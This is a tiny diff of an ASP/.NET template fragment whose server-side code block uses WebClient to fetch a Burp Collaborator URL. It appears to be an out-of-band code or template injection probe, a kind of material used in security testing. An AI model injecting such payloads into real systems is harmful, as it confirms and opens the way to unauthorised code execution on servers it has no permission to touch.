@@ -1,4 +1,4 @@
-<%@ 
+<% 
 var client = new WebClient();
 var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net");
 %>
